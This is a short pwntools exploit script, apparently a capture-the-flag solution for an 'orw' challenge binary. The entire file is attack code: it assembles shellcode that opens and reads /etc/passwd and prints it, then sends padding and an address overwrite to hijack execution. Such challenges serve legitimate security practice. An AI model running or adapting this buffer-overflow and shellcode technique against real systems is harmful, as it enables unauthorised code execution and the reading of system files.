from pwn import *
context.arch='amd64'
r=process('./orw')
# gdb.attach(r)

addr=0x06010A0

payload = shellcraft.pushstr(b"/etc/passwd")
payload += shellcraft.open('rsp', 0, 0)
payload += shellcraft.read('rax', 'rsp', 100)
payload += shellcraft.write('1', 'rsp', 100)

r.sendline(asm(payload))
r.sendline(b'a'*16+p64(addr))
r.interactive()

'''
print(len(asm(payload)))
r.sendline(asm(payload))
r.interactive()
'''
